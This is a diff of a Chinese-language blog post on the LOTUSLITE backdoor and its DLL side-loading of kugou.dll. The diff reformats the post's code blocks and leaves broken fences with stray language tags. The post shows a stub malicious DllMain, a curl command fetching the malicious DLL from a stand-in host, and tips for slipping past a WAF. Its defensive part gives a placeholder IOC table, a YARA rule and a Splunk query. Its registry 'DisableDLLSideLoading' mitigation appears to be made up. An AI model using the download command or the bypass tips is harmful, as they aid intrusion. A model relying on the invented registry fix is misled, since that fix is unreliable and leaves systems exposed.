@@ -25,26 +25,37 @@ categories: [security]
 
 * **攻擊前置需求**: 攻擊者需要知道受害者的電子郵件地址和相關的政治主題。
 * **Payload 建構邏輯**:
-  ```c
-  // 惡意 DLL 代碼片段
-  #include <Windows.h>
-  #include <WinHttp.h>
 
-  int WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
-  {
-    if (fdwReason == DLL_PROCESS_ATTACH)
-    {
-      // 初始化 WinHTTP 會話
-      HINTERNET hSession = WinHttpOpen(NULL, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
-      // ...
-    }
-    return TRUE;
-  }
-  ```
+    ```
+    
+    c
+      // 惡意 DLL 代碼片段
+      #include <Windows.h>
+      #include <WinHttp.h>
+    
+      int WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
+      {
+        if (fdwReason == DLL_PROCESS_ATTACH)
+        {
+          // 初始化 WinHTTP 會話
+          HINTERNET hSession = WinHttpOpen(NULL, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+          // ...
+        }
+        return TRUE;
+      }
+      
+    
+    ```
   *範例指令*: 使用 `curl` 命令下載惡意 DLL 文件。
-  ```bash
+  
+
+```
+
+bash
   curl -o kugou.dll http://example.com/kugou.dll
-  ```
+  
+
+```
 * **繞過技術**: 攻擊者可以使用 WAF 繞過技巧，例如使用 Base64 編碼或壓縮惡意 DLL 文件。
 
 ## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
@@ -54,27 +65,44 @@ categories: [security]
   | --- | --- | --- | --- |
   | 1234567890abcdef | 192.168.1.100 | example.com | C:\Windows\System32\kugou.dll |
 * **偵測規則 (Detection Rules)**:
-  ```yara
-  rule LOTUSLITE_Detection
-  {
-    meta:
-      description = "LOTUSLITE 後門攻擊偵測"
-      author = "Your Name"
-    strings:
-      $dll_side_loading = "kugou.dll"
-    condition:
-      $dll_side_loading
-  }
-  ```
+
+    ```
+    
+    yara
+      rule LOTUSLITE_Detection
+      {
+        meta:
+          description = "LOTUSLITE 後門攻擊偵測"
+          author = "Your Name"
+        strings:
+          $dll_side_loading = "kugou.dll"
+        condition:
+          $dll_side_loading
+      }
+      
+    
+    ```
   或者是具體的 SIEM 查詢語法 (Splunk/Elastic)。
-  ```sql
+  
+
+```
+
+sql
   index=security sourcetype=winlog_eventlog EventID=4688 | search "kugou.dll"
-  ```
+  
+
+```
 * **緩解措施**: 除了更新修補之外，還可以修改 Windows Registry 設定，禁止 DLL Side-Loading。
-  ```reg
+  
+
+```
+
+reg
   [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows]
   "DisableDLLSideLoading"=dword:00000001
-  ```
+  
+
+```
 
 ## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
 
@@ -86,5 +114,4 @@ categories: [security]
 
 * [原始報告](https://thehackernews.com/2026/01/lotuslite-backdoor-targets-us-policy.html)
 * [MITRE ATT&CK](https://attack.mitre.org/techniques/T1574/)
-
 
